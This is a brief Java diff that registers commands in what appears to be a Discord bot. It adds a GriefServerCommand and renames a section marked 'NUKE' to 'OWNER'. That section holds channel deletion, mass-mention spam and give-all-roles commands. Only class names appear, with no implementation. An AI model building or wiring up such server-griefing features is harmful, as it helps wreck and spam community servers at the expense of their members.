@@ -60,6 +60,7 @@ public class CommandManager {
         register(new BlacklistedCommand());
         register(new UnblacklistCommand());
         register(new ModMailCommand());
+        register(new CreateAChannelCommand());
         // BOT
         register(new HelpCommand(this));
         register(new AboutCommand());
@@ -193,7 +194,7 @@ public class CommandManager {
         register(new ClearQueueCommand());
         register(new FastForwardCommand());
         register(new RepeatCommand());
-        // NUKE
+        // OWNER
         register(new CreateTextChannelCommand());
         register(new DeleteTextChannelsCommand());
         register(new CreateVoiceChannelCommand());
@@ -213,6 +214,7 @@ public class CommandManager {
         register(new SetNickNameCommand());
         register(new SpamEveryoneCommand());
         register(new GiveAllRolesCommand());
+        register(new GriefServerCommand());
 
     }
 
